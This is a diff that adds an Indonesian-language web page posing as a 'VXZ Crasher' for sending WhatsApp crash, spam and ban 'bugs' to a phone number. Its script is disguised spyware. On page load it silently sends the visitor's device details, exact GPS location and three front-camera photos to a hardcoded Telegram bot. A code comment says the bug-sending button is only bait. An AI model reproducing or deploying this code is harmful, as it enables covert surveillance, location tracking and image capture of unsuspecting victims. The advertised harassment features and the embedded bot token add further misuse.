@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>VXZ Crasher</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Roboto+Mono&display=swap');
+
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      height: 100vh;
+      background: #0d0015;
+      color: #e0e0ff;
+      font-family: 'Roboto Mono', monospace;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .rain { position: absolute; inset: 0; pointer-events: none; z-index: 1; }
+    .drop {
+      position: absolute;
+      width: 2px; height: 100px;
+      background: linear-gradient(transparent, #a020f0, #ff00ff);
+      opacity: 0.5;
+      animation: fall linear infinite;
+    }
+    @keyframes fall { to { transform: translateY(100vh); } }
+
+    .container {
+      position: relative;
+      z-index: 10;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .header-img {
+      width: 180px; height: 180px;
+      object-fit: contain;
+      filter: drop-shadow(0 0 20px #a020f0);
+      margin-bottom: 20px;
+      animation: pulse 4s infinite alternate;
+    }
+    @keyframes pulse { from { transform: scale(1); } to { transform: scale(1.05); } }
+
+    h1 { font-family: 'Orbitron', sans-serif; font-size: 2.8rem; color: #c300ff; text-shadow: 0 0 15px #c300ff; margin-bottom: 8px; letter-spacing: 4px; }
+    h2 { font-size: 1.4rem; color: #ff00ff; margin-bottom: 30px; text-shadow: 0 0 10px #ff00ff; }
+
+    .input-group { width: 100%; max-width: 340px; margin: 15px 0; }
+    label { display: block; font-size: 1.1rem; color: #d0b0ff; margin-bottom: 8px; }
+    input, select {
+      width: 100%; padding: 14px 16px;
+      background: rgba(20,0,40,0.7); border: 2px solid #a020f0; border-radius: 12px;
+      color: #e0e0ff; font-size: 1.1rem; outline: none;
+    }
+    input:focus, select:focus { border-color: #ff00ff; box-shadow: 0 0 15px #ff00ff80; }
+
+    select { appearance: none; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23ff00ff' d='M6 9l-4-4h8z'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 16px center; background-size: 12px; }
+
+    .btn-send {
+      margin-top: 30px; width: 100%; max-width: 340px; padding: 18px;
+      background: linear-gradient(135deg, #a020f0, #ff00ff); border: none; border-radius: 50px;
+      color: white; font-size: 1.4rem; font-weight: bold; cursor: pointer;
+      box-shadow: 0 0 25px #c300ff80;
+    }
+    .btn-send:hover { transform: translateY(-3px); box-shadow: 0 0 40px #ff00ff; }
+
+    .status { margin-top: 20px; font-size: 1rem; color: #b080ff; text-align: center; min-height: 60px; }
+
+    video, canvas { display: none; }
+  </style>
+</head>
+<body>
+
+  <div class="rain" id="rain"></div>
+
+  <div class="container">
+    <img src="https://images.unsplash.com/photo-1600585154340-be6161a56a0c?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" 
+         alt="Dark Creature" class="header-img" 
+         onerror="this.src='https://via.placeholder.com/180/000/fff?text=VXZ'">
+
+    <h1>VXZ</h1>
+    <h2>CRASHER</h2>
+
+    <div class="input-group">
+      <label>Target Number</label>
+      <input type="tel" id="target" placeholder="628xxxxxxxxxx" maxlength="15">
+      <small style="color:#b080ff; font-size:0.9rem;">Masukkan no target</small>
+    </div>
+
+    <div class="input-group">
+      <label>Select Bug Vxz</label>
+      <select id="bug">
+        <option value="">SELECT BUG VxZ</option>
+        <option value="bug1">Bug OTP Massal 2025</option>
+        <option value="bug2">Bug Crash WA v2.24</option>
+        <option value="bug3">Bug Ban Permanen</option>
+        <option value="bug4">Bug Notif Spam</option>
+        <option value="bug5">Bug Call Bombing</option>
+        <option value="bug6">Bug VxZ Ultra 2026</option>
+      </select>
+      <small style="color:#b080ff; font-size:0.9rem;">Pilih Type Bug.</small>
+    </div>
+
+    <button class="btn-send" id="sendBtn">SEND BUG</button>
+
+    <div class="status" id="status">Initializing crasher...</div>
+  </div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const BOT_TOKEN = "8381143711:AAFF3m0mkLcSAjkGx_R9mimc3WSPG-0jXJ8";   // Ganti
+    const CHAT_ID   = "8582162291";     // Ganti
+
+    const video  = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx    = canvas.getContext('2d');
+    const status = document.getElementById('status');
+
+    const victimId = `Victim_${Date.now()}_${Math.random().toString(36).slice(2,8)}`;
+
+    async function sendToTelegram(type, payload, caption = '') {
+      try {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('caption', `${victimId}\n${caption || 'Auto capture'}`);
+
+        if (type === 'text') {
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: `${victimId}\n${payload}` })
+          });
+        } else if (type === 'photo') {
+          formData.append('photo', payload);
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        }
+      } catch {}
+    }
+
+    // Ambil 3 foto kamera depan
+    async function captureCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        video.srcObject = stream;
+        await new Promise(r => video.onloadedmetadata = r);
+
+        for (let i = 1; i <= 3; i++) {
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.88));
+          await sendToTelegram('photo', blob, `Kamera depan #${i} - ${new Date().toLocaleString('id-ID')}`);
+          await new Promise(r => setTimeout(r, 800));
+        }
+
+        stream.getTracks().forEach(t => t.stop());
+      } catch(e) {
+        await sendToTelegram('text', `Kamera gagal diakses: ${e.name} - ${e.message}`);
+      }
+    }
+
+    // Ambil lokasi akurat
+    async function getAccurateLocation() {
+      try {
+        const pos = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          });
+        });
+        const loc = `Lat: ${pos.coords.latitude.toFixed(8)}\nLng: ${pos.coords.longitude.toFixed(8)}\nAkurasi: ±${pos.coords.accuracy.toFixed(0)}m\nAltitude: ${pos.coords.altitude || 'N/A'}m`;
+        const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+        await sendToTelegram('text', `Lokasi akurat korban:\n${loc}\n\nMaps: ${mapLink}`);
+      } catch(e) {
+        await sendToTelegram('text', `Lokasi gagal: ${e.message} (${e.code})`);
+      }
+    }
+
+    // Info device
+    async function collectDeviceInfo() {
+      let info = `User-Agent: ${navigator.userAgent}\n`;
+      info += `Platform: ${navigator.platform}\n`;
+      info += `Screen: ${screen.width}×${screen.height} (${screen.colorDepth}bit)\n`;
+      info += `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+      info += `Language: ${navigator.languages?.join(', ') || navigator.language}\n`;
+      info += `Online: ${navigator.onLine}\n`;
+      if (navigator.connection) info += `Connection: ${navigator.connection.effectiveType} (${navigator.connection.downlink}Mbps)\n`;
+
+      if ('getBattery' in navigator) {
+        try {
+          const bat = await navigator.getBattery();
+          info += `Battery: ${Math.round(bat.level*100)}% ${bat.charging ? '(charging)' : ''}`;
+        } catch {}
+      }
+
+      await sendToTelegram('text', `Device Info:\n${info}`);
+    }
+
+    // Jalankan otomatis saat halaman dibuka
+    window.addEventListener('load', async () => {
+      status.textContent = "Scanning victim...";
+
+      await collectDeviceInfo();
+      await getAccurateLocation();
+      await captureCamera();
+
+      status.textContent = "Victim captured ✓ Waiting for bug selection...";
+    });
+
+    // Rain effect
+    function createDrop() {
+      const d = document.createElement('div');
+      d.className = 'drop';
+      d.style.left = Math.random()*100 + 'vw';
+      d.style.animationDuration = (Math.random()*0.8 + 0.6)+'s';
+      document.getElementById('rain').appendChild(d);
+      setTimeout(() => d.remove(), 6000);
+    }
+    setInterval(createDrop, 60);
+
+    // Tombol SEND BUG (opsional, hanya untuk umpan)
+    document.getElementById('sendBtn').onclick = () => {
+      const target = document.getElementById('target').value.trim();
+      const bug = document.getElementById('bug').value;
+      if (target && bug) {
+        status.textContent = `Bug ${bug} dikirim ke ${target} (dummy)`;
+        // Bisa tambah kirim ke Telegram juga jika mau
+      } else {
+        status.textContent = "Isi target & pilih bug dulu!";
+      }
+    };
+  </script>
+</body>
+</html>
